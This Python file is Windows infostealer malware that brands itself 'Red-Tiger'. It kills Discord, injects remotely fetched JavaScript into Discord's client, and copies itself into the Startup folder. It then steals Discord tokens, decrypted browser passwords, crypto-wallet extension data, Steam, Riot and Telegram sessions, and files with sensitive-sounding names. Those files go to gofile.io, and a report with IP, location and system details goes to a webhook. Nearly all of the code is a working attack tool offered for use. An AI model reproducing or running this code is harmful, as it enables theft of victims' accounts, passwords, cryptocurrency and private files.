import os
import platform
import ctypes
from screeninfo import get_monitors
import psutil
import GPUtil
import threading
from sys import executable
from sqlite3 import connect as sql_connect
from base64 import b64decode
from json import loads as json_loads, load
import json
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import sys
import shutil
import socket
import ssl
import requests
from Crypto.Cipher import AES

try:
 ssl._create_default_https_context = ssl._create_unverified_context

 inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
    
 DETECTED = False

 def g3t1p():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

 requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"],
 ]
 for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 temp = os.getenv("TEMP")
 Threadlist = []

 class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

 def G3tD4t4(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

 def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G3tD4t4(blob_out)

 def D3kryptV4lU3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

 def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
    for i in range(8): 
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

 def TR6st(C00k13):
    
    global DETECTED
    data = str(C00k13)
    tim = re.findall(".google.com", data)
    
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
    
 process_list = os.popen('tasklist').readlines()

 for process in process_list:
    if "Discord" in process:
        
        pid = int(process.split()[1])
        os.system(f"taskkill /F /PID {pid}")

 def G3tb1ll1ng(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if b1ll1ngjson == []: return "```None```"

    b1ll1ng = ""
    for methode in b1ll1ngjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                b1ll1ng += ":credit_card:"
            elif methode["type"] == 2:
                b1ll1ng += ":parking: "

    return b1ll1ng

 def inj_discord():

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj_content = requests.get(inj_url).text

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj_content)
 inj_discord()


 def G3tT0k4n1nf9(t0k3n):
    try:
     headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
    
     us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
     username_token = us3rjs0n["username"]
     hashtag_token = us3rjs0n["discriminator"]
     email_token = us3rjs0n["email"]
     id_token = us3rjs0n["id"]
     pfp_token = us3rjs0n["avatar"]
     flags_token = us3rjs0n["public_flags"]
     nitro_token = ""
     phone_token = ""
    

     if "premium_type" in us3rjs0n: 
        nitrot = us3rjs0n["premium_type"]
        if nitrot == 1:
            nitro_token = "Nitro"
        elif nitrot == 2:
            nitro_token = "Nitro Boosts"
     if "phone" in us3rjs0n: ph0n3 = f'{us3rjs0n["phone"]}'
    except:
     us3rjs0n, username_token, hashtag_token, email_token, id_token, pfp_token, flags_token, nitro_token, phone_token = "N/A"
    return username_token, hashtag_token, email_token, id_token, pfp_token, flags_token, nitro_token, phone_token

 def ch1ckT4k1n(t0k3n):
    headers = {
        "Authorization": t0k3n,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

 if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
 else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

 fileName = os.path.basename(sys.argv[0])
 filePath = os.path.join(currentFilePath, fileName)

 startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 startupFilePath = os.path.join(startupFolderPath, fileName)

 if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)

 def R4f0rm3t(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

 def upl05dT4k31(t0k3n, path):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)

    if pfp == None: 
        pfp = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3

 T0k3ns = ''
 def getT0k3n(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for t0k3n in re.findall(regex, line):
                        global T0k3ns
                        if ch1ckT4k1n(t0k3n):
                            if not t0k3n in T0k3ns:
                               
                                T0k3ns += t0k3n
                                upl05dT4k31(t0k3n, path)

 P4ssw = []
 def getP4ssw(path, arg):
    global P4ssw, P4sswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            P4ssw.append(f"""URL: {row[0]} | USERNAME: {row[1]} | PASSWORD: {D3kryptV4lU3(row[2], master_key)}""")
            P4sswCount += 1


 def G3tD1sc0rd(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    
    
    for file in os.listdir(pathC):
       
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0k3ns
                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ch1ckT4k1n(t0k3nDecoded):
                        if not t0k3nDecoded in T0k3ns:
                            
                            T0k3ns += t0k3nDecoded
                            
                            upl05dT4k31(t0k3nDecoded, path)


 def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

 def Z1pTh1ngs(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if "ejbalbakoplchlghecdalmeeeajnimhm" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_Edge"
        pathC = path + arg
    
    if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Exodus_{browser}"
        pathC = path + arg

    if "fhbohimaelbohpjbbldcngcnapndodjp" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Binance_{browser}"
        pathC = path + arg

    if "hnfanknocfeofbddgcijnmhnfnkdnaad" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Coinbase_{browser}"
        pathC = path + arg

    if "egjidjbpglichdcondbcbdnbeeppgdph" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Trust_{browser}"
        pathC = path + arg

    if "bfnaelmomeimhlpmgjnjophhpkkoljpa" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Phantom_{browser}"
        pathC = path + arg
    
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg or "koplchlghecd" in arg or "aelbohpjbbld" in arg or "nocfeofbddgc" in arg or "bpglichdcond" in arg or "momeimhlpmgj" in arg or "dialjgjfhomi" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


 def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

 def uploadToAnonfiles(path):
   try:
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False
   except:
       ()



 def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

 KiwiFiles = []
 def KiwiFile(path, keywords):
  try:
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])
  except:
     ()

 def Kiwi():
  try:
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret",
        "senhas",
        "contas",
        "backup",
        "2fa",
        "importante",
        "privado",
        "exodus",
        "exposed",
        "perder",
        "amigos",
        "empresa",
        "trabalho",
        "work",
        "private",
        "source",
        "users",
        "username",
        "login",
        "user",
        "usuario",
        "log"
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith
  except:
     ()

 global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip

 keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
 ]

 CookiCount, P4sswCount = 0, 0
 cookiWords = []
 paswWords = []

 WalletsZip = [] 
 GamingZip = []
 OtherZip = []

 Account = P4sswCount
 GatherAll()

 account = P4ssw
 account_number = P4sswCount
 
 
#Recuperation des infos du token

 headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
 username_token, hashtag_token, email_token, id_token, pfp_token, flags_token, nitro_token, phone_token = G3tT0k4n1nf9(T0k3ns)
 
 if nitro_token in ['', ' ', '  ', '   ', '0', 'none']:
   nitro_token = "N/A"
 if hashtag_token in ['0', '', 'none', ' ']:
   hashtag_token = "N/A"  
 if pfp_token == None: 
        pfp_token = "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless"
 else:
        pfp_token = f"https://cdn.discordapp.com/avatars/{id_token}/{pfp_token}"
except:
 username_token, hashtag_token, email_token, id_token, flags_token, nitro_token, phone_token, T0k3ns = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", 
 P4ssw, P4sswCount = 0
pfp_token = "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless"
token = T0k3ns


#Recuperation du nom du pc
try:
  nom_pc = socket.gethostname()
except:
 nom_pc = "N/A"

try:
 nom_utilisateur = os.getlogin()
except:
 nom_utilisateur = "N/A"

#Recuperation de l'IP Publique
try:
 response = requests.get('https://httpbin.org/ip')
        
 ip_address_public = response.json()['origin']

except:
 ip_address_public = "N/A"

#Recuperation de l'IP Local
try:
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(('8.8.8.8', 80))

 ip_address_local = s.getsockname()[0]

 s.close()
except:
 ip_address_local = "N/A"


#Recuperation de l'IP Ipv4
try:
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(('8.8.8.8', 80))  

 ip_address_ipv4 = s.getsockname()[0]
 s.close()
except:
 ip_address_ipv4 = "N/A"


#Recuperation de l'IP Ipv6
try:
 s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
 s.connect(('2001:4860:4860::8888', 80))

 ip_address_ipv6 = s.getsockname()[0]
except:
 ip_address_ipv6 = "N/A"

from urllib.request import Request, urlopen
from json import *


#Recuperation localisation
try:
 ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip_address_public}")).read().decode().replace('callback(', '').replace('})', '}')
 ipdata = loads(ipdatanojson)
except:
 ipdata = 'N/A'

try:
 pays = ipdata["country_name"]
except:
  pays = "N/A"
try:
 ville = ipdata["city"]
except:
 ville = "N/A"
try:
 pays_code = ipdata["country_code"].lower()
except:
  pays_code = "N/A"
try:
 postal = ipdata["postal"]
except:
  postal = "N/A"
try:
 etat = ipdata["state"]
except:
  etat = "N/A"


#Recuperation de son systeme d'exploitation
try:
 system_info = {platform.system()}
 system_version_info = platform.version()
except:
 system_info = "N/A"
 system_version_info = "N/A"

#Recuperation des RAM
try:
 ram_info = round(psutil.virtual_memory().total / (1024**3), 2)
except:
 ram_info = "N/A"

#Recuperation du processeur et des coeur
try:
 cpu_info = platform.processor()
 cpu_coeur_info = psutil.cpu_count(logical=False)
except:
 cpu_info = "N/A"
 cpu_coeur_info = "N/A"

#Recuperation de la carte graphique
try:
 gpus = GPUtil.getGPUs()
 gpu_info = gpus[0].name if gpus else "N/A"
except:
 gpu_info = "N/A"


#Recuperation info disque
try:
 disk_info = psutil.disk_usage(path='/')

 espace_disque = round(disk_info.total / (1024**3), 2)
 espace_utilise_disque = round(disk_info.used / (1024**3), 2)
 espace_dispo_disque = round(disk_info.free / (1024**3), 2)
except:
 disk_info = "N/A"
 espace_disque = "N/A"
 espace_utilise_disque = "N/A"
 espace_dispo_disque = "N/A"

#Lettre disque dur
try:
 repertoire_courant = os.getcwd()

 lettre_lecteur = os.path.splitdrive(repertoire_courant)[0]
except:
 lettre_lecteur = "N/A"


#Recuperer portable ou fix
try:
 def is_portable():
    try:
        battery = psutil.sensors_battery()
        return battery is not None and battery.power_plugged is not None
    except AttributeError:
        return False

 if is_portable():
    plateforme_info = 'Pc Portable'
 else:
    plateforme_info = 'Pc Fixed'
except:
 plateforme_info = "N/A"


#Recuperer les info ECRAN PRINCIPAL:
try:
 def get_resolution():
    hdc = ctypes.windll.user32.GetDC(0)
    width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)  
    height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
    ctypes.windll.user32.ReleaseDC(0, hdc)
    return width, height

 for i, monitor in enumerate(get_monitors(), 1):
    if monitor.is_primary:
        width, height = get_resolution()
        name = monitor.name
        is_primary = 'Yes'

 principal_ecran = f"""Name         : "{name}" 
Resolution   : "{width}x{height}"
Main Screen  : "{is_primary}"
"""
except:
 principal_ecran = "N/A"

#Recuperer info ECRAN SECONDAIRE
try:
 def get_resolution():
    hdc = ctypes.windll.user32.GetDC(0)
    width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8) 
    height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10) 
    ctypes.windll.user32.ReleaseDC(0, hdc)
    return width, height


 monitors = list(get_monitors())

 if len(monitors) > 1:

    second_monitor = monitors[1]

    width, height = get_resolution()

    second_ecran =  f"""Name         : "{name}" 
Resolution   : "{width}x{height}"
Main Screen  : "No"
"""
 else:
   second_ecran = 'N/A'
except:
 second_ecran = "N/A"
webhook_invit = 'fgdfgq'
def send_embed_url(webhook_url):

    embed_data = {
        'title': f'Account ({account_number}) "{ip_address_public}":',
        'description': f'{P4ssw}',
        'color': color,
        "author": author,
        "footer": footer,
        "thumbnail": {
                "url": pfp_token
                }
        
    }


    data = {
        'embeds': [embed_data],
        'username': username,  
        'avatar_url': avatar_url 
    }


    json_data = json.dumps(data)


    headers = {
        'Content-Type': 'application/json'
    }


    response = requests.post(webhook_url, data=json_data, headers=headers)

def send_embed(webhook_url):

    embed_data = {
        'title': title,
        "fields": fields,
        'color': color,
        "author": author,
        "footer": footer,
        "thumbnail": {
                "url": pfp_token
                }
        
    }


    data = {
        'embeds': [embed_data],
        'username': username,  
        'avatar_url': avatar_url 
    }


    json_data = json.dumps(data)


    headers = {
        'Content-Type': 'application/json'
    }


    response = requests.post(webhook_url, data=json_data, headers=headers)

title = f'Info "{ip_address_public}":'

fields = [
    {"name": f":bust_in_silhouette: | User Pc:", "value": f"""```Name     : "{nom_pc}"
Username : "{nom_utilisateur}"```""", "inline": False},

    {"name": f":computer: | System:", "value": f"""```Plateform    : "{plateforme_info}"
Exploitation : "{system_info} {system_version_info}"

CPU : "{cpu_info} {cpu_coeur_info} Core"
GPU : "{gpu_info}"
RAM : "{ram_info}Go"```""", "inline": False},

{"name": f":satellite: | Ip:", "value": f"""```Public   : "{ip_address_public}"
Local    : "{ip_address_local}"
Ipv4     : "{ip_address_ipv4}"
Ipv6     : "{ip_address_ipv6}"```""", "inline": False},

{"name": f":minidisc: | Disk:", "value": f"""```Drive      : "{lettre_lecteur}/Users/{nom_utilisateur}/"

Total     : "{espace_disque}Go"
Used      : "{espace_utilise_disque}Go"
Available : "{espace_dispo_disque}Go"```""", "inline": False},

{"name": f":desktop: | Screen:", "value": f"""```Main Screen:
{principal_ecran}

Secondary Screen:
{second_ecran}```""", "inline": False},

{"name": f":earth_africa: | Location:", "value": f"""```Country  : "{pays}"
State    : "{etat}"
Postal   : "{postal}"
City     : "{ville}"```""", "inline": False},

{"name": f":speech_balloon: | Discord:", "value": f"""```Username : {username_token}
Hashtag  : #{hashtag_token}
Id       : {id_token}
Nitro    : {nitro_token}
Email    : {email_token}
Token    : {token}```""", "inline": False},

{"name": f":link: | Webhook Use:", "value": f"""```{webhook_invit}```""", "inline": False},
#{"name": f"", "value": f"""```{}```""", "inline": False},
] 

author =  {
        "name": "Red-Tiger | Stealer Create",
        "url": "https://github.com/fluzzzy/RedTiger-Fluzypro",
        "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
          }

footer = {
        "text": "Red-Tiger",
        "icon_url": "https://media.discordapp.net/attachments/944760272265031720/1179429697495498834/IMG_1506.png?ex=6582fb00&is=65708600&hm=cbdc48779b762d4d7c95c34bb68a8aabf8314519d0b50c4d7371bea19eac5db4&=&format=webp&quality=lossless",
        }

color = 0xB20000
username = 'Red-Tiger'
avatar_url = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'

send_embed(webhook_invit)
send_embed_url(webhook_invit)